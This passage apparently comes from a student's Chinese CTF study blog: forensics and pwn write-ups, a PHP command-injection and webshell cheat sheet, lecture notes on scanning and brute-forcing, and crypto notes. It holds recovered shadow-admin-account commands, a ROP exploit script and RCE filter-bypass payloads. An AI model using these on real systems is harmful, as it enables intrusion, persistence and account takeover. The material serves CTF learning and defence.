\"15\": \"R\",\"16\": \"S\", \"17\": \"T\", \"18\": \"U\", \"19\": \"V\", \"1a\": \"W\", \"1b\": \"X\", \"1c\": \"Y\", \"1d\": \"Z\", \"1e\": \"!\",\"1f\": \"@\", \"20\": \"#\", \"21\": \"$\", \"22\": \"%\", \"23\": \"^\", \"24\": \"&\", \"25\": \"*\", \"26\": \"(\", \"27\": \")\",\"28\": \"<RET>\", \"29\": \"<ESC>\", \"2a\": \"<DEL>\", \"2b\": \"\\t\", \"2c\": \"<SPACE>\", \"2d\": \"_\", \"2e\": \"+\", \"2f\": \"{\",\"30\": \"}\", \"31\": \"|\", \"32\": \"~\", \"33\": \":\", \"34\": \"\\\"\", \"35\": \"~\", \"36\": \"<\", \"37\": \">\", \"38\": \"?\",\"39\": \"<CAP>\", \"3a\": \"<F1>\", \"3b\": \"<F2>\", \"3c\": \"<F3>\", \"3d\": \"<F4>\", \"3e\": \"<F5>\", \"3f\": \"<F6>\",\"40\": \"<F7>\", \"41\": \"<F8>\", \"42\": \"<F9>\", \"43\": \"<F10>\", \"44\": \"<F11>\", \"45\": \"<F12>\"}\ndef extract_usbhid_data(json_file):\n    with open(json_file, 'rb') as file:\n        data = json.load(file)\n    \n    result_string = \"\"\n    for packet in data:\n        layers = packet['_source']['layers']\n        if 'usbhid.data' in layers:\n            usbhid_data = layers['usbhid.data'].split(':')\n            \n            # 提取第二个字节（用于判断是否使用shiftKeys）\n            second_byte = usbhid_data[1]\n            \n            # 根据第二个字节选择合适的映射表\n            key_map = shiftKeys if second_byte != \"00\" else normalKeys\n            \n            # 遍历所有可能的按键数据（从第三个字节开始）\n            for byte_index in range(2, len(usbhid_data)):\n                key_code = usbhid_data[byte_index]\n                if key_code == \"00\":\n                    continue  # 忽略空值\n                \n                key_char = key_map.get(key_code, '')\n                result_string += key_char\n    \n    return result_string\nif __name__ == \"__main__\":\n    extracted_string = extract_usbhid_data('USBPcap.json')\nprint(\"Extracted String:\", extracted_string)\n```\n- 跑出来：\n```\nm]<F6>[2m[m33[]3333mmmbao<SPACE>bao,zui<SPACE>jin<SPACE>you<SPACE>ge<SPACE>nan<SPACE>sheng<SPACE>xiang<SPACE>zhui<SPACE>wo,ta<SPACE>jiaaoo<SPACE>wwaang<SPACE>qi<SPACE>zhao<DEL><DEL><DEL><DEL>qi<SPACE>zao<SPACE>wang<SPACE>ta<SPACE>shuo<SPACE>ta<SPACE>ai<SPACE>wo,dan<SPACE>shi<SPACE>cong<SPACE>bu<SPACE>baanng<SPACE>wo<SPACE>na<SPACE>kuai<SPACE>di,hao<SPACE>fan<SPACE>aRcmd<RET>L]bdfgghiiklnnoomljji]i<F7>h]i]i3j]k3lmlmkmhigmgfmemedmbcaaabbb[22[<F6>[<F6>[2222[2[2[<F6>[2llllllllm2m[][3<F6>[mm2mmmmmm]abcedeemdme]eefeggif3fcbba]3mmaccmcmf3f]h]g3f]e3d3c]c3b]b]]3mmmmm[[<F6><F6><F6><F6>[l2llabeeegffdca<SPACE>whoami<RET>net<SPACE>user<RET>net<SPACE>user<SPACE>qianqianwoaini$<SPACE>abcdefghijk<CAP>i<CAP>mn<SPACE>/add<RET>net<SPACE>localgroup<SPACE>administrators<SPACE>qianqianwoaini$<SPACE>/add<RET>net<SPACE>user<SPACE>qianqianwoaini$<SPACE>/del[ll22<F6><F6><F6><F6>[[[22lmll222l2llllllllcgikllmmlljjhhhfecb<F7><F7>]]<F6><F6><F6><F6><F6><F6>[22[2[[[[<F6>[<F6><F6><F6>[<F6>[[2[22lmlm<RET>net<SPACE>localgroup<SPACE>administrators<SPACE>qianqianwoaini$<SPACE>/add<RET>rundll32<SPACE>url.dll,<CAP>f<CAP>ile<CAP>p<CAP>rotocol<CAP>h<CAP>andler<SPACE>https://fakeupdate.net/win10ue/bsod.htmlgmjmk3gecmcmaa3mmmamm<RET>ceghkm<F7>m<F7>n<F7>n<F7>l<F7>l]j<F7>h]fdb<F7><F7>lllllllll\n```\n- 整理有：\n```\nbao bao,zui jin you ge nan sheng xiang zhui wo,ta jiaaoo wwaang qi zhao<DEL><DEL><DEL><DEL>qi zao wang ta shuo ta ai wo,dan shi cong bu baanng wo na kuai di,hao fan a\n```\n- Wang_Qi_Zhao\n\n#### 7. 起早王对倩倩的电脑执行了几条 cmd 里的命令\n- 7\n- 上题整理：\n```\nwhoami\nnet user\nnet user qianqianwoaini$ abcdefghijkImn /add\nnet localgroup administrators qianqianwoaini$ /add\nnet user qianqianwoaini$ /del\nnet localgroup administrators qianqianwoaini$ /add\nrundll32 url.dll,FileProtocolHandler https://fakeupdate.net/win10ue/bsod.html\n```\n\n#### 8. 倩倩电脑中影子账户的账户名和密码\n- 账户名: qianqianwoaini$ 密码: abcdefghijkImn\n- net user qianqianwoaini$ abcdefghijkImn /add\n\n#### 9. 起早王对倩倩的电脑执行的最后一条命令¶\n- rundll32 url.dll,FileProtocolHandler https://fakeupdate.net/win10ue/bsod.html\n- 开了个假蓝屏的网页"},{"title":"ctfshow-pwn合集wp","url":"/2025/10/15/ctfshow-pwn合集wp/","content":"#### pwn0【待】\n![alt text](/img/ctfshow-pwn合集wp_s-1.png)\n- 通过打开容器后获得命令，在finalshell通过手动输入信息成功ssh连上\n- 注意：虚拟机开启NAT模式才能连上，更改模式后重启才生效\n![alt text](/img/ctfshow-pwn合集wp_s-2.png)\n- pwd指令查看当前目录\n- ls发现当前目录下没东西\n- cd /回到上一级目录\n- ls发现当前目录下有文件ctfshow_flag\n- cat ctfshow_flag得到 flag\n\n#### pwn1\n- chmod 777 pwn给附件加权限\n- checksec pwn查看附件信息，64 位\n![alt text](/img/ctfshow-pwn合集wp_s-3.png)\n- wp要ida看但其实试运行一遍还有题目都提示nc链接，容器给的命令直接复制黏贴就好了\n![alt text](/img/ctfshow-pwn合集wp_s-4.png)\n\n#### pwn2\n- 加权限-查信息-运行-nc连接-shell输入代码\n- system(bin/sh)就是给shell？？\n\n#### pwn4\n![alt text](/img/ctfshow-pwn合集wp_s-5.png)\n- 反编译程序理解-shell获得\n\n#### pwn40\n- [参考1](https://blog.csdn.net/Myon5/article/details/138152238?spm=1001.2101.3001.10796)；[参考2](https://blog.csdn.net/weixin_45556441/article/details/114631043)；参考3：sq-wp\n- 目前进度：仅复刻\n- 注意：exp.py有基于容器修改点\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\np = remote('152.32.191.198', 33778) # 容器域名+端口\npayload = b'a'*(0xA+8) + p64(0x4007e3) + p64(0x400808) + p64(0x4004fe) + p64(0x400520)\np.sendline(payload)\np.interactive()\n# 152.32.191.198:33778\n```\n\n#### pwn46\n","tags":["wp","ctf","pwn"],"categories":["wp"]},{"title":"宝塔面板知识点","url":"/2025/10/13/宝塔面板知识点/","content":"\n#### 忘记Linux 3.X/4.x/5.x/6.x/7.x 宝塔面板密码的解决方案\n- 进入ssh，推荐先安装 堡塔SSH客户端 (免费/简单/中文/多屏) ，输入以下命令重置密码（把命令最后面的“testpasswd”替换成你要改的新密码）\n  - 注：若是debian/ubuntu用户，请使用有root权限的账户去执行这条命令\n```\ncd /www/server/panel && btpython tools.py panel testpasswd\n```\n紫框即你要修改的密码\n红框即面板账户\n- 如果提示多次登录失败，暂时禁止登录 请输入以下命令 清除登录限制\n```\nrm -f /www/server/panel/data/*.login\n```\n- 新装面板用户获取默认账号密码命令：（获得为默认密码，不显示更改后密码！！！）\n```\nbt default\n```\n- 6.x及以后版本可输入```bt```\n\n\n#### 宝塔目录结构框架————[来源](https://www.kancloud.cn/microcloud/btcn/1507255)\n- 宝塔后台数据库叫default.db\n- 宝塔的工具面板的代码是在/www/server/panel下面\n```\n/www/\n├── backup  ----------------------------------->宝塔面板的备份文件目录          \n│   ├── database------------------------------>宝塔面板的数据库备份目录\n│   ├── panel--------------------------------->宝塔面板配置自动备份目录（6.9.32版本新添加）\n│   │   └── 2019-10-16----------------------->宝塔面板配置自动备份的文件，默认是以年月日格式备份，数量为15天\n│   └── site---------------------------------->宝塔面板站点备份目录\n├── server------------------------------------->宝塔面板服务目录（比较关键）\n│   ├── data---------------------------------->mysql数据库服务的目录\n\t\t├── xindb.cn.err----------------------->数据库错误日志文件（比较重要，数据库启动不了可以将此日志文件打开，找到最新的日志发给DBA进行分析错误）\n\t\t├── xindb.cn.pid----------------------->存放数据库pid的文件\n│   ├── nginx--------------------------------->nginx的主目录\n│   │   ├── client_body_temp\n│   │   ├── conf----------------------------->nginx的默认配置目录\n│   │   ├── fastcgi_temp\n│   │   ├── html\n│   │   │   ├── 50x.html\n│   │   │   └── index.html\n│   │   ├── logs----------------------------->nginx的日志目录\n│   │   │   ├── error.log\n│   │   │   └── nginx.pid\n│   │   ├── off\n│   │   ├── proxy_cache_dir\n│   │   ├── proxy_temp_dir\n│   │   ├── rpm.pl\n│   │   ├── sbin\n│   │   │   └── nginx----------------------->nginx的启动文件\n│   │   ├── scgi_temp\n│   │   ├── uwsgi_temp\n│   │   ├── version.pl\n│   │   └── waf\n│   │       ├── config.lua\n│   │       ├── init.lua\n│   │       └── waf.lua\n│   ├── panel--------------------------------->面板文件目录（最为重要）\n│   │   ├── BTPanel\n│   │   ├── class\n│   │   ├── config\n│   │   ├── data\n│   │   ├── default.pl\n│   │   ├── init.sh\n│   │   ├── install-------------------------->面板软件安装脚本路径\n│   │   │   ├── install_soft.sh\n│   │   │   ├── lib.sh\n│   │   │   ├── mysql.sh\n│   │   │   ├── nginx.sh\n│   │   │   ├── phpmyadmin.sh\n│   │   │   ├── php.sh\n│   │   │   ├── public.sh------------------->安装软件主脚本\n│   │   │   └── pureftpd.sh\n│   │   ├── license.txt\n│   │   ├── logs------------------------------>面板日志存放目录\n│   │   │   ├── access.log------------------->面板访问日志文件\n│   │   │   ├── certbot.log\n│   │   │   ├── error.log-------------------->面板错误日志文件\n（面板打不开或者软件安装不了，可以打开这个文件将最新的日志信息发到宝塔论坛）\n│   │   │   ├── panel.pid\n│   │   │   ├── request\n│   │   │   │   └── 2019-10-16.json\n│   │   │   └── task.log\n│   │   ├── rewrite--------------------------->伪静态存放目录\n│   │   │   ├── apache----------------------->apache默认的伪静态规则目录\n│   │   │   │   ├── dedecms.conf\n│   │   │   │   ├── default.conf\n│   │   │   │   ├── discuzx2.conf\n│   │   │   │   ├── discuzx3.conf\n│   │   │   │   ├── discuzx.conf\n│   │   │   │   ├── ecshop.conf\n│   │   │   │   ├── EmpireCMS.conf\n│   │   │   │   ├── list.txt\n│   │   │   │   ├── mvc.conf\n│   │   │   │   ├── phpcms.conf\n│   │   │   │   ├── phpwind.conf\n│   │   │   │   ├── thinkphp.conf\n│   │   │   │   ├── wordpress.conf\n│   │   │   │   └── zblog.conf\n│   │   │   └── nginx------------------------->nginx默认的伪静态规则存放目录\n│   │   │       ├── dabr.conf\n│   │   │       ├── dbshop.conf\n│   │   │       ├── dedecms.conf\n│   │   │       ├── default.conf\n│   │   │       ├── discuz.conf\n│   │   │       ├── discuzx2.conf\n│   │   │       ├── discuzx3.conf\n│   │   │       ├── discuzx.conf\n│   │   │       ├── drupal.conf\n│   │   │       ├── ecshop.conf\n│   │   │       ├── emlog.conf\n│   │   │       ├── EmpireCMS.conf\n│   │   │       ├── laravel5.conf\n│   │   │       ├── maccms.conf\n│   │   │       ├── mvc.conf\n│   │   │       ├── niushop.conf\n│   │   │       ├── phpcms.conf\n│   │   │       ├── phpwind.conf\n│   │   │       ├── sablog.conf\n│   │   │       ├── seacms.conf\n│   │   │       ├── shopex.conf\n│   │   │       ├── thinkphp.conf\n│   │   │       ├── typecho2.conf\n│   │   │       ├── typecho.conf\n│   │   │       ├── wordpress.conf\n│   │   │       ├── wp2.conf\n│   │   │       └── zblog.conf\n│   │   ├── runconfig.py\n│   │   ├── runserver.py\n│   │   ├── runserver.pyc\n│   │   ├── script------------------------------>面板计划任务备份脚本目录\n│   │   │   ├── backup\n│   │   │   ├── backup.py\n│   │   │   ├── ftp.sh\n│   │   │   ├── GetOS.sh\n│   │   │   ├── install.sh\n│   │   │   ├── logsBackup\n│   │   │   ├── logsBackup.py\n│   │   │   └── rememory.sh\n│   │   ├── ssl---------------------------------->面板证书目录\n│   │   │   ├── certificate.pem\n│   │   │   └── privateKey.pem\n│   │   ├── task.py\n│   │   ├── tmp\n│   │   ├── tools.py\n│   │   ├── tools.pyc\n│   │   └── vhost-------------------------------->站点配置文件目录\n│   │       ├── apache--------------------------->apache 站点配置文件目录\n│   │       │   ├── 0.default.conf\n│   │       │   └── xindb.cn.conf\n│   │       ├── cert----------------------------->站点证书目录\n│   │       ├── nginx---------------------------->nginx站点配置文件目录\n│   │       │   ├── 0.default.conf\n│   │       │   ├── xindb.cn.conf\n│   │       │   └── phpfpm_status.conf\n│   │       ├── rewrite-------------------------->站点重定向配置文件目录\n│   │       │   └── xindb.cn.conf\n│   │       ├── template\n│   │       │   ├── apache\n│   │       │   └── nginx\n│   │       │       ├── anti.conf\n│   │       │       ├── error_page.conf\n│   │       │       ├── other.conf\n│   │       │       ├── proxy.conf\n│   │       │       ├── redirect.conf\n│   │       │       └── ssl.conf\n│   │       ├── tomcat---------------------------->tomcat站点配置文件目录\n│   │       └── wafconf\n│   │           ├── args\n│   │           ├── blockip\n│   │           ├── cookie\n│   │           ├── denycc\n│   │           ├── post\n│   │           ├── returnhtml\n│   │           ├── url\n│   │           ├── user-agent\n│   │           ├── whiteip\n│   │           └── whiteurl\n│   ├── php---------------------------------------->php安装目录\n│   │   └── 54\n│   ├── phpmyadmin\n│   ├── pure-ftpd\n├── wwwlogs----------------------------------------->站点日志目录（当站点打不开或者出错，将最新错误日志发到论坛）\n│   ├── access.log\n│   ├── xindb.cn.error.log\n│   ├── xindb.cn.log\n│   ├── nginx_error.log\n│   └── waf\n├── wwwroot----------------------------------------->站点根目录\n│   └── xindb.cn\n│       ├── 404.html\n│       └── index.html\n```","tags":["宝塔","linux"],"categories":["知识点笔记"]},{"title":"cty笔记转载","url":"/2025/10/10/ctj笔记转载/","content":"\n### 一句话木马相关命令执行\n- 语句\n  - system() \n    - 执行外部程序(命令行)并返回命令输出的第一行为字符串.  \n    - 失败返回 false,如果没有找到命令返回空字符串.  \n   - passthru() \n    - 与 system()不同，passthru()直接把命令执行的结果输出到标准输出,而不返回.  \n  - shell_exec() \n    - 返回输出第一行的内容,无回显.需要反弹 shell 使用.  \n  - exec()\n    - 不回显,返回命令执行的结果.  \n  - ``\n    - 在 php 中,反引号\"`”是可以执行系统命令的.  \n    - 反引号和 shell_exec()等价  \n- 命令执行\n  - 解法\n    - 解法1：passthru\n      - ?c=passthru(\"tac%20fla*\");\n  - 解法2：绕过*号\n    - 假如*号被过滤了，我们可以通过?c=passthru(\"ls\");\n    - 先获取flag.php是目标，然后再通过？来匹配单个字母，也就是fla?????匹配flag.php\n    - ?c=passthru(\"tac%20fla?????\");\n  - 解法3：反字节符配合echo\n    - ?c=echo(`ls`);\n    - ?c=echo%20`tac%20fla*`;\n  - 解法4：带参数输入\n    - ?c=eval($_GET[1]);&1=system(\"tac%20flag.php\")；\n    - 1参数逃逸，不属于c，可以使用被ban内容\n    - web31\n  - 解法5：exec\n    - echo%20exec(\"cat%20f\\lag.p\\hp\");\n  - 解法6：system\n    - ?c=system(\"tac%20fla*\"); \n  - 解法7：利用cp或mv命令将flag拷贝到别处\n    - ?c=system(\"cp%20fl*g.php%20a.txt%20\");\n    - 然后浏览器访问a.txt，读取即可\n    - eg. web30\n  - 解法8：万能\n    - ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n    - ?c=eval(array_pop(next(get_defined_vars())));\n  - 如果;被ban，php代码最后一行可以不用; 然后换成?>就行了\n  - 如果php被ban，可以用短标签\n- 对小数点的限制可以使用通配符*或者占位符？来绕过\n- preg_match是正则匹配\n- /i : 忽略大小写\n- 过滤空格，flag：cat$IFS`ls`\n- 绕过空格过滤：\n  - ${IFS}$9\n  - {IFS}\n  - $IFS\n  - ${IFS}\n  - IFS\n  - < \n  - <> \n  - {cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来\n  - %09   (tab)\n  - X=\\$'cat\\\\x09./flag.php';$X       （\\x09表示tab，也可以用\\x20）\n  - /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php\n- windows 或 linux 下:\n  - command1 && command2 先执行 command1，如果为真，再执行 command2\n  - command1 | command2 只执行 command2\n  - command1 & command2 先执行 command2 后执行 command1\n  - command1 || command2 先执行 command1，如果为假，再执行 command2\n  - 命令执行漏洞（| || & && 称为 管道符）\n### 代码执行\n- isset()\n  - 函数返回一个布尔值，如果变量存在且不包含NULL值，则返回TRUE，否则返回FALSE。\n- eval() \n  - 代码执行函数,把输入的字符串当作 php 代码执行.  \n  - 可以 eval(?><?php [input]?>[text] <?[p])，也就是用标签声明一段 php代码结束后再声明下一段代码开始\n  - 在函数输入的结尾需要打分号,否则会报 unexpected ending\n- assert() \n  - 断言函数 assert(),在 RCE 中可以简单的认为它等同于 eval()  \n- preg_match()\n  - 如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。\n- preg_replace()  \n  - 函数执行一个正则表达式的搜索和替换\n- ${}\n  - 如果出现在字符串里就会被解析,并执行其中的 php 代码\n  - ${}本是用于在字符串中嵌入变量和执行表达式的\n\n","tags":["ctf","转载","笔记"],"categories":["知识点笔记"]},{"title":"SPC新生讲座笔记","url":"/2025/10/09/讲座笔记/","content":"- python库踩坑：\n```python\npip install pycryptodome\n```\n- sq\n  - 爆破，伪加密，社工，掩码，字典\n  - pwn\n    - 看环境，找漏洞，破解\n    - **看环境，然后导入附件之后用checksec –file命令去看保护，比如你发现它没有RX保护就可以在栈上直接执行命令诸如此类**——sq\n- hackbar\n  - SQL：提供三种数据库的sql查询语句，以及一些方便联合查询的语句\n  - XSS：提供xss攻击语句\n  - string.fromcharcode()：将根据UNICODE 值来输出xss语句\n  - html charactor ： 将XSS语句转化为HTML字符实体（以&开头）\n  - alert(xss) statement : 构建一条xss测试语句，弹出一个框内容为xss，相当于alert('xss');\n  - Encryption：对所选字符进行加密，提供了MD5，SHA-1，SHA-256，ROT13等加密方式\n  - Encoding：对所选字符进行编码解码，提供了Base64 Encode,Base64 Decode,URLencode,URLdecode, HEX encoding, HEX decoding等方式\n  - Other： addslashes：在每个双引号前加反斜杠 stripslashes：除去所选字符中的反斜杠 strip space：除去所选字符中的空格 reverse：将所选字符倒序排列 usefull strings：提供了一些特殊的数值如圆周率PI,斐波那契数列等，其中buffer overflow 可以输入一定长度的字符造成缓存溢出攻击\n\n- 搭建网站\n  - service apache2 starrt\n  - python app文件夹\n  - java 哪里都有可能\n- sudo vim a.php →172..../a.php\n- python搭建 路由\n\n- 渗透\n  - y0usef可能是用户信息\n  - 前期信息收集\n  - 漏洞点-功能点里找\n    - Upload extend/base/找到位置\n  - nmap探活\n  - NAT模式-虚拟机能够在一个网段\n  - nmap -sP \n  - ipconfig\n  - 扫描端口service apache2 start\n  - 3306 33060 mycircle（？？？\n  - 无影（软件\n  - nmap -p- 192...扫描端口\n  - pin命令更快，因为window防火墙\n  - ssh远程连接\n  - 扫版本号信息\n- CVE 0day nday 1day\n          - ↑\n  - wordpress hexo模板通用漏洞\n  - apache也有\n- nmap -p加特定端口- -sVC 192.。。\n- kali自带：searchhploid apache 2.4.10\n- sudo find / -name \"...py\"→漏洞位置？？\n- cat 位置\n- Tomcat java no php?\n- ssh 用finalshell天狐渗透\n- nmap --script=ssh-brute 192...爆破\n- hydra -l ...txt noend字典爆破\n- 源代码→信息查找\n\n- dirsearch -u 地址\n- /.dockerfile 放网址后面可能直接得到答案\n- 403无权访问 302 301——状态码\n- Forbidden→无法访问状态\n\n- Burpsuite   代理抓包ctrl+R发送到REsquest  方便查看\n- Burpsuite  拓展Bypass WAF绕过403\n- B  intruder 狙击手**长度**一样-失败  trylogin失败\n\n- ？关键点复制发送绕过去？？？\n- hackbar也可以？？？\n\n- 爆破 sql注入  XXE？？\n\n- fuzz字典→搜索得到字典文件\n\n- yakit插件bypass403绕过——200成功\n- intruder-资源池\n- 账户admin root 字典-交叉 payload集：2加字典，1输入\n- CSS美化不看\n- 上传抓包B  一句话木马 上传失败 限制 找信息变化 文件头文件类型文件长度检测\n- Content-Type（限制描述\n\n- GIF89a  ??放过去\n\n- 一句话木马\n- <？php @eval>\n- 标签\n- request(同时接受request post) post cookie\n- 存储cookie\n- 中国蚁剑？？（软件\n- 右键 虚拟终端-环境变量里\n- yousef形容用户\n- 1000**提权**？？\n- Finalshell ssh连接\n\n- SSTI\n- find / -user root -perm -4000 print 2>/dev/null\n- base64 。。。txt  strings不要用\n- 无回显？？\n- awb\n\n电子取证\n- 计算机，服务器，手机1取证\n- exe,数据库，网站，区块链，物联网，流量，内存取证\n- conf后缀文件 信息重灾区 一种用于存储软件或系统配置信息的文件格式。\n- auth\n  \n电子取证\n- 方向：计算机取证，服务器取证，⼿机取证\n  - exe取证，数据库取证，⽹站取证，区块链取证，物联⽹取证，流量取证，内存取证\n- 工具\n  - vmware workstation（虚拟机运⾏），kali linux（linux环境），010editor/winhex（⼗六进制编辑器），vscode/pycharm（代码）\n- 电脑取证：xways forensics\n- 磁盘：ufs，ftk imager，efdd\n- 解密：ctool，passwarekit，hashcat，cyberchef\n- 数据库：dbbrowser，navicat\n- 内存取证：volatility\n- 流量取证：wireshark（pcapng），fiddler（saz）\n- apk取证：夜神模拟器/雷电模拟器/雷神模拟器，MT管理器，jadx-gui\n- 服务器取证：xshell/finalshell/xterminal ssh⼯具\n- exe取证：沙箱，die，ida，⽕绒\n","tags":["ctf","笔记","电子取证"],"categories":["知识点笔记"]},{"title":"扩展欧几里得算法[待]","url":"/2025/10/06/扩展欧几里得算法/","content":"\n知识递进：\n1. 同余符号：a = b % c ; b ≡ a mod c → **a % c = b % c**\n   rsa中应用：c = m ^ e % n ；m ^ e ≡ c mod n\n2. gcd(a,b)\n   基础算法：for i in range(0,min(a,b)):\n                if a % i == 0 | b % i == 0:\n                    return i\n3. 欧几里得算法又称辗转相除法，是指用于计算两个正整数a，b的最大公约数。\n   [此时mod等同于%] gcd(a,b) = gcd(b,a mod b)\n   原理：两个整数的最大公约数等于其中较小的数和两数相除余数的最大公约数。\n   算法：\n   求gcd(a,b)[假设a>b]：\n   a ÷ b = c mod d\n   b ÷ d = e mod f\n   d ÷ f = g mod h\n   if h == 0 → f = gcd(a,b)\n4. 证明：gcd(a,b) = gcd(b,a mod b) (不妨设a＞b 且r=a mod b ,r不为0)\n- 法一：公约数是最大公约数的因子，得到d = e\n\n![alt text](/img/扩展欧几里得算法_3-5.png)\n- 法二(感觉网上这个有点错误，改了下)\n  假设c = gcd(a,b),则存在m,n，使a = mc, b = nc;\n  令r = a mod b，即存在k，a = kb+r, 使r = a-kb = mc - knc = (m-kn)c;\n  故gcd(b,a mod b) = gcd(b,r) = gcd(nc,(m-kn)c) = gcd(n,m-kn)c;\n  则c为b与a mod b的公约数;\n  假设d = gcd(n,m-kn), 则存在x,y, 使n = xd, m-kn = yd; 故m = yd+kn = yd+kxd = (y+kx)d;\n  故有a = mc = (y+kx)dc, b = nc = xdc; 可得 gcd(a,b) = gcd((y+kx)dc,xdc) >= dc;\n  由于gcd(a,b) = c, 【故 c >= dc, d <= 1 ,又d = gcd(n,m-kn)，所以d >= 1, 】（自己删改的部分）综上：d = 1;\n  即gcd(n,m-kn) = 1, 故可得gcd(b,a mod b) = c;\n  故得证gcd(a,b) = gcd(b,a mod b).\n\n[原解法来源](https://baike.baidu.com/item/%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/1647675)\n","tags":["ctf","crypto"],"categories":["知识点笔记"]},{"title":"SPC新生讲座题目wp","url":"/2025/10/06/SPC新生讲座题目/","content":"### 鸣谢\n- 感谢sq,xc学长和cty学姐的帮助和教导！！！\n- 除了大头像放后面做其他也是完结了，第一次wp磕磕绊绊做出来了嘻嘻\n\n### 曼波曼波曼波\n- 倒转的base，翻转脚本：\n```python\n# 读取 txt 文件并翻转内容\ndef reverse_txt_file(input_path, output_path):\n    try:\n        with open(input_path, 'r', encoding='utf-8') as file:\n            content = file.read()\n        \n        reversed_content = content[::-1]\n        \n        with open(output_path, 'w', encoding='utf-8') as file:\n            file.write(reversed_content)\n        \n        print(f\"成功！原文件: {input_path}\")\n        print(f\"反转文件: {output_path}\")\n        print(f\"原内容长度: {len(content)} 字符\")\n        print(f\"反转内容长度: {len(reversed_content)} 字符\")\n        \n    except FileNotFoundError:\n        print(f\"错误：找不到文件 {input_path}\")\n    except Exception as e:\n        print(f\"错误：{e}\")\n\ninput_file = r'E:\\app-down\\题目工作区\\mbmb\\smn.txt'\noutput_file = r'E:\\app-down\\题目工作区\\reversed_smn.txt'\n\nreverse_txt_file(input_file, output_file)\n\n```\n- AI：Base64 编码的 ZIP 文件数据，解码后就恢复成原始的 ZIP 二进制文件。\n- 使用 CyberChef（厨子）：https://gchq.github.io/CyberChef/\n    - Input (Base64字符串) \n    - Drag \"From Base64\" recipe \n    - 得到二进制数据\n    - 点击右下角下载按钮保存为 .zip 文件\n- 双图盲水印：\n  - [方法原地址](https://www.shuzhiduo.com/A/kjdwEn0wJN/)\n  - 注意：在文件下打开poweshell\n  - 存档-电脑此工具位置：E:\\app-down\\双图盲水印\\BlindWaterMark-master\\BlindWaterMark-master\n\n### ida使用.exe\n```\nWelcome to Reverse Engineering!!!\n欢迎来到逆向工程！！！\n\nPress Enter to find flag1\n按 Enter 键查找 flag1\n\nNSSCTF{\nNSSCTF{\n```\n\n```\nNext, I will teach you how to use ida.\n接下来，我将教你如何使用 IDA。\n\nThe first step is to open the exe file with ida.\n第一步是用 IDA 打开 exe 文件。\n\nF5 can convert the current interface into pseudo C code\nF5 可以将当前界面转换为伪 C 代码\n\nThe shortcut key shfit + F12 is to view strings. We can often find the entry point here.\n快捷键 Shift + F12 用于查看字符串。我们经常可以在这里找到入口点。\n\nYou can see flag2 there\n你可以在那里看到 flag2\n```\n- function页面找main文件，在“You can see flag2 there”处快捷键 Shift + F12 ，找到：IDA_1s_4_VeRy_Impo\n- 双击后页面按X连接可以看到flag2\n![alt text](/img/SPC新生讲座题目_2-11.png)\n- Tab 键进入伪C代码页面，双击函数可进入详细界面\n```\nThe tab key can switch between the assembly and disassembly interfaces, and sometimes disassembly can interfere with our analysis.\nTab 键可以在汇编和反汇编界面之间切换，有时候反汇编会干扰我们的分析。\n```\n- Tab 键进入汇编页面，观察call类型以及灰色翻译部分\n![alt text](/img/SPC新生讲座题目_2-9.png)\n```\nIn ida, shift+E can extract data in order of the size of the program\n在 IDA 中，Shift+E 可以按程序大小顺序提取数据\n\nThe R key is to convert data into character form\nR 键是将数据转换为字符形式\n\nTry to find flag3\n尝试找到 flag3\n```\n- 看mov，英文猜测important所以是倒序\n- 断店操作：Debugger-local windows debugger-运行（如果没有窗口window-reset desktop）\n- 直接双击找shift+E R 导出为string，得到：rTant_t0ol_iN_ \n![alt text](/img/SPC新生讲座题目_3-1.png)\n```\nThe left side of ida is the function, and sometimes you can find important information from the function name.\nIDA 的左侧是函数列表，有时候你可以从函数名中找到重要信息。\n\nThe patch method can achieve our goal by directly modifying the binary file\n打补丁的方法可以通过直接修改二进制文件来实现我们的目标\n\nFLAG4 NOT HRER\nFLAG4 不在这里\n```\n- flag4(void)（？汇编文件，选取函数名称搞补丁\n![alt text](/img/SPC新生讲座题目_3-2.png)\n- 通过任选printf()右键Assemble，改call后为函数名称，enter修改\n![alt text](/img/SPC新生讲座题目_3-3.png)\n- 右键Patching-apply导出，运行新程序得到：rever5e_en8ine3ring}\n![alt text](/img/SPC新生讲座题目_3-4.png)\n- 注：在 IDA 中从流程图视图切换回连续的文本/表格视图用空格键\n- 最后答案：NSSCTF{IDA_1s_4_VeRy_ImporTant_t0ol_iN_rever5e_en8ine3ring}\n\n### twoEs1\n- 题目：\n```python\nfrom Cryptodome.Util.number import *\nimport random\n\nflag=b\"SPCCTF{********}\"\n\np, q = getPrime(512), getPrime(512)\nn = p * q\n\ne1 = random.getrandbits(32)\ne2 = random.getrandbits(32)\n\nimport gmpy2\ns,s1,s2=gmpy2.gcdext(e1,e2)\nprint(s)\n#导入 gmpy2 库进行大数运算 \n#gmpy2.gcdext(a,b)计算扩展欧几里得算法 返回 (g,s,t)，其中 g=gcd(a,b)，且 s*a + t*b = g\n\nm = bytes_to_long(flag)\nc1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n\nprint(f'{n = }')\nprint(f'{e1 = }')\nprint(f'{e2 = }')\nprint(f'{c1 = }')\nprint(f'{c2 = }')\n\n'''\nn = 77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973\ne1 = 1550550838\ne2 = 4196113069\nc1 = 10879882027555312937608696756143487708492509877667613620249639748606727334006539946052668627697088875994270713711095280209616987454727654075073679556671706894288288425066016765935927179268631914629763649753266424293357163466575462028472324055698901991171526421270840161635556574472647431065514324250656887711\nc2 = 3011958986718808526365150648555525977083765700624932707761381505508399298854491454270664897732491521128964864382168158216240628717617068568110917894811504799962807736416471284350198523924590448858301736435406723758509936349838419125901147351088181623044341056413457153562300106346324761118425649126782967195\n'''\n```\n- 解决方案(基于gcd = 1以及n相同加密)\n```python\nimport gmpy2\nfrom Cryptodome.Util.number import long_to_bytes\n\nn = 77653027019410283582708662091841984922043011758121679079881183020813164663803315218162399044305258074482737579924642303624296916990420038267507847806411365847770079739424288020008734096352715536212355610499244337263033620679172659903396470522388964976403280440005666750783772493205491694203801534799771603973\ne1 = 1550550838\ne2 = 4196113069\nc1 = 